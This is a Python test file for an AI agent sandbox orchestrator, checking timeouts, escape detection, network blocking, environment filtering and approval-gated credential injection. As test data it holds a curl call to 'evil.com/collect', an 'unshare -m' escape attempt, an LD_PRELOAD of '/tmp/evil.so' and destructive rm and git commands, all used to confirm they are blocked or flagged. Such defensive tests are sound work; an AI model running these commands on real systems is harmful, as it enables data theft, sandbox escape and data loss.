"""M3 sandbox orchestrator checks."""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

from shisad.core.session import CheckpointStore, SessionManager
from shisad.core.types import CredentialRef
from shisad.executors.mounts import FilesystemPolicy, MountRule
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.executors.sandbox import (
    DegradedModePolicy,
    EnvironmentPolicy,
    ResourceLimits,
    SandboxBackend,
    SandboxConfig,
    SandboxEnforcement,
    SandboxOrchestrator,
    SandboxType,
)
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore


def _resolver(_hostname: str) -> list[str]:
    return ["93.184.216.34"]


def test_m3_sandbox_timeout_and_output_truncation(tmp_path: Path) -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    timeout_result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "import time; time.sleep(2)"],
            limits=ResourceLimits(timeout_seconds=1, output_bytes=1024),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert timeout_result.allowed is True
    assert timeout_result.timed_out is True

    truncation_result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "print('x' * 8000)"],
            limits=ResourceLimits(timeout_seconds=5, output_bytes=128),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert truncation_result.allowed is True
    assert truncation_result.truncated is True
    assert len(truncation_result.stdout.encode("utf-8")) <= 128


def test_m3_sandbox_creates_checkpoint_for_destructive_commands(tmp_path: Path) -> None:
    checkpoint_store = CheckpointStore(tmp_path / "checkpoints")
    session = SessionManager().create(channel="cli")
    target = tmp_path / "notes.txt"
    target.write_text("hello", encoding="utf-8")

    orchestrator = SandboxOrchestrator(
        proxy=EgressProxy(resolver=_resolver),
        checkpoint_store=checkpoint_store,
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="file.write",
            command=["rm", "-f", str(target)],
            write_paths=[str(target)],
            filesystem=FilesystemPolicy(
                mounts=[MountRule(path=f"{tmp_path.as_posix()}/**", mode="rw")]
            ),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        ),
        session=session,
    )
    assert result.allowed is True
    assert bool(result.checkpoint_id)
    assert not target.exists()


def test_m3_sandbox_blocks_escape_signals_and_network_disabled_commands() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    escape = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=["unshare", "-m"],
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert escape.allowed is False
    assert escape.escape_detected is True
    assert "escape_signal" in escape.reason

    no_network = orchestrator.execute(
        SandboxConfig(
            tool_name="http_request",
            command=["curl", "https://evil.com/collect"],
            network=NetworkPolicy(allow_network=False, allowed_domains=[]),
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert no_network.allowed is False
    assert no_network.reason == "network:network_disabled"


def test_m3_sandbox_fail_closed_on_degraded_security_critical_controls() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "print('ok')"],
            sandbox_type=SandboxType.VM,
            security_critical=True,
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
        )
    )
    assert result.allowed is False
    assert result.reason == "degraded_enforcement"
    assert "seccomp" in result.degraded_controls


def test_m3_sandbox_build_environment_edge_cases() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    env, err, dropped = orchestrator._build_environment(
        EnvironmentPolicy(allowed_keys=["ALLOWED"], max_keys=4, max_total_bytes=64),
        {"NOT_ALLOWED": "x"},
    )
    assert err is None
    assert dropped == ["NOT_ALLOWED"]
    assert env == {}

    env2, err2, _ = orchestrator._build_environment(
        EnvironmentPolicy(allowed_keys=["A", "B"], max_keys=1, max_total_bytes=64),
        {"A": "1", "B": "2"},
    )
    assert env2 == {}
    assert err2 == "env_too_many_keys"

    env3, err3, _ = orchestrator._build_environment(
        EnvironmentPolicy(allowed_keys=["A"], max_keys=4, max_total_bytes=8),
        {"A": "0123456789"},
    )
    assert env3 == {}
    assert err3 == "env_too_large"

    env4, err4, _ = orchestrator._build_environment(
        EnvironmentPolicy(allowed_keys=["LD_PRELOAD"], denied_prefixes=["LD_"]),
        {"LD_PRELOAD": "/tmp/evil.so"},
    )
    assert env4 == {}
    assert err4 == "env_key_denied:LD_PRELOAD"


def test_m3_sandbox_select_backend_logic() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    explicit = orchestrator._select_backend(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "print('ok')"],
            sandbox_type=SandboxType.VM,
        )
    )
    assert explicit == SandboxType.VM

    network = orchestrator._select_backend(
        SandboxConfig(
            tool_name="http_request",
            command=[sys.executable, "-c", "print('ok')"],
            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        )
    )
    assert network == SandboxType.CONTAINER

    file_only = orchestrator._select_backend(
        SandboxConfig(
            tool_name="file.read",
            command=[sys.executable, "-c", "print('ok')"],
            read_paths=["/tmp/file.txt"],
        )
    )
    assert file_only == SandboxType.NSJAIL


def test_m3_sandbox_destructive_detection_edge_cases() -> None:
    assert SandboxOrchestrator.is_destructive(["ls", "-la"]) is False
    assert SandboxOrchestrator.is_destructive(["git", "status"]) is False
    assert SandboxOrchestrator.is_destructive(["git", "clean", "-d", "-f"]) is True
    assert SandboxOrchestrator.is_destructive(["git", "reset", "HEAD", "--hard"]) is True
    assert SandboxOrchestrator.is_destructive(["git", "push", "--force"]) is True
    assert SandboxOrchestrator.is_destructive(["bash", "-lc", "echo hi > note.txt"]) is True


def test_m3_sandbox_injects_placeholders_into_command_and_env() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "real-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    orchestrator = SandboxOrchestrator(
        proxy=EgressProxy(credential_store=store, resolver=_resolver)
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "import os; print(os.environ['AUTH'])"],
            env={"AUTH": placeholder},
            environment=EnvironmentPolicy(allowed_keys=["PATH", "LANG", "TERM", "HOME", "AUTH"]),
            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
            network_urls=["https://api.good.com/v1/send"],
            approved_by_pep=True,
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is True
    assert "real-secret-token" in result.stdout


def test_m3_sandbox_blocks_placeholder_injection_without_pep_approval() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "real-secret-token",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    orchestrator = SandboxOrchestrator(
        proxy=EgressProxy(credential_store=store, resolver=_resolver)
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", "print('noop')"],
            env={"AUTH": placeholder},
            environment=EnvironmentPolicy(allowed_keys=["PATH", "LANG", "TERM", "HOME", "AUTH"]),
            network=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
            network_urls=["https://api.good.com/v1/send"],
            approved_by_pep=False,
            degraded_mode=DegradedModePolicy.FAIL_OPEN,
            security_critical=False,
        )
    )
    assert result.allowed is False
    assert result.reason == "network:pep_not_approved"


def test_m3_rr2_unavailable_runtime_blocks_undeclared_file_write(tmp_path: Path) -> None:
    target = tmp_path / "outside.txt"
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
        backend=SandboxType.NSJAIL,
        runtime="",
        enforcement=SandboxEnforcement(
            filesystem=False,
            network=False,
            env=True,
            seccomp=False,
            resource_limits=True,
            dns_control=False,
        ),
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", f"open(r'{target}', 'w').write('x')"],
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
            security_critical=True,
        )
    )
    assert result.allowed is False
    assert result.reason == "degraded_enforcement"
    assert target.exists() is False


def test_m3_rr2_runtime_metadata_drift_fail_closed_blocks_preinvoke(tmp_path: Path) -> None:
    target = tmp_path / "drift-write.txt"
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
        backend=SandboxType.NSJAIL,
        runtime="",
        enforcement=SandboxEnforcement(
            filesystem=True,
            network=True,
            env=True,
            seccomp=True,
            resource_limits=True,
            dns_control=True,
        ),
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", f"open(r'{target}', 'w').write('x')"],
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
            security_critical=True,
        )
    )
    assert result.allowed is False
    assert result.reason == "runtime_isolation_unavailable"
    assert "runtime_isolation" in result.degraded_controls
    assert target.exists() is False


def test_m3_rr2_unknown_runtime_wrapper_fail_closed_blocks_preinvoke(tmp_path: Path) -> None:
    target = tmp_path / "wrapper-mismatch.txt"
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
        backend=SandboxType.NSJAIL,
        runtime="/tmp/not-a-supported-wrapper",
        enforcement=SandboxEnforcement(
            filesystem=True,
            network=True,
            env=True,
            seccomp=True,
            resource_limits=True,
            dns_control=True,
        ),
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[sys.executable, "-c", f"open(r'{target}', 'w').write('x')"],
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
            security_critical=True,
        )
    )
    assert result.allowed is False
    assert result.reason == "runtime_isolation_unavailable"
    assert "runtime_isolation" in result.degraded_controls
    assert target.exists() is False


def test_m3_rr2_unavailable_runtime_blocks_undeclared_network_attempt() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    orchestrator._backends[SandboxType.NSJAIL] = SandboxBackend(
        backend=SandboxType.NSJAIL,
        runtime="",
        enforcement=SandboxEnforcement(
            filesystem=False,
            network=False,
            env=True,
            seccomp=False,
            resource_limits=True,
            dns_control=False,
        ),
    )
    result = orchestrator.execute(
        SandboxConfig(
            tool_name="shell.exec",
            command=[
                sys.executable,
                "-c",
                "import socket; socket.create_connection(('example.com', 443), 0.2)",
            ],
            network=NetworkPolicy(allow_network=False, allowed_domains=[]),
            degraded_mode=DegradedModePolicy.FAIL_CLOSED,
            security_critical=True,
        )
    )
    assert result.allowed is False
    assert result.reason == "degraded_enforcement"


@pytest.mark.asyncio
async def test_m3_sandbox_execute_async_does_not_block_event_loop() -> None:
    orchestrator = SandboxOrchestrator(proxy=EgressProxy(resolver=_resolver))
    loop = asyncio.get_running_loop()
    started = loop.time()
    execution = asyncio.create_task(
        orchestrator.execute_async(
            SandboxConfig(
                tool_name="shell.exec",
                command=[sys.executable, "-c", "import time; time.sleep(0.2)"],
                limits=ResourceLimits(timeout_seconds=2, output_bytes=1024),
                degraded_mode=DegradedModePolicy.FAIL_OPEN,
                security_critical=False,
            )
        )
    )
    await asyncio.sleep(0.05)
    elapsed = loop.time() - started
    assert elapsed < 0.15
    await execution
